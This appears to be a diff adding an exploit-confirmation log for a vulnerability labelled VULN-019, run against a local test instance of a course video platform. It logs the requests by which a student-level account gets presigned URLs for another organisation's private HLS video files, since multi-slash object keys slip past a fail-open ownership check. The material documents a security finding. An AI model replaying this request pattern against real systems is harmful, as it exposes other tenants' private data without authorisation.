@@ -1,0 +1,16 @@
+========================================================================
+VULN-019: HLS multi-slash presign cross-org read (fail-open owner resolution)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] owner regex requires exactly one '/'; HLS keys (>=2 '/') -> null -> 'legacy' -> empty owner -> allowed
+[SETUP] attacker is a plain STUDENT org member: bdbbbace-e4f5-46c5-83df-20a7d0edaaae roles={'48bbdff8-2ad5-46a3-a259-2ca3d52677dd': 3}
+[SETUP] seeded foreign private object: videos/22222222-2222-4222-8222-222222222222/hls/master-m_1c27ffca.m3u8
+[STEP] attacker POST /course/presign/video/download keys=[33333333-3333-4333-8333-333333333333/private-v_97180328.mp4]  (single slash, foreign org)
+[INFO]   -> HTTP 403 {"success":false,"error":"One or more requested keys do not belong to this organization","code":"FORBIDDEN"}  (expect 403: guard works here)
+[STEP] attacker POST /course/presign/video/download keys=[22222222-2222-4222-8222-222222222222/hls/master-m_1c27ffca.m3u8]  (>=2 slashes, foreign org)
+[INFO]   -> HTTP 200 {"success":true,"urls":{"22222222-2222-4222-8222-222222222222/hls/master-m_1c27ffca.m3u8":"http://localhost:21528/videos/22222222-2222-4222-8222-222222222222/hl  (expect 200: FAIL OPEN)
+[STEP] attacker GET http://localhost:21528/videos/22222222-2222-4222-8222-222222222222/hls/master-m_1c27ffca.m3u8?<presigned>
+[INFO]   download -> HTTP 200, 82 bytes
+[PROOF] guard REJECTED single-slash foreign key 33333333-3333-4333-8333-333333333333/private-v_97180328.mp4 (403) but ALLOWED foreign multi-slash HLS key 22222222-2222-4222-8222-222222222222/hls/master-m_1c27ffca.m3u8 (200); the signed URL downloaded the exact private bytes -> fail-open cross-org read of the private `videos` bucket
+==> VULN-019: CONFIRMED — multi-slash HLS keys bypass the ownership guard and are presigned
+[OK] exploit confirmed — fail-open owner resolution on >=2-slash keys
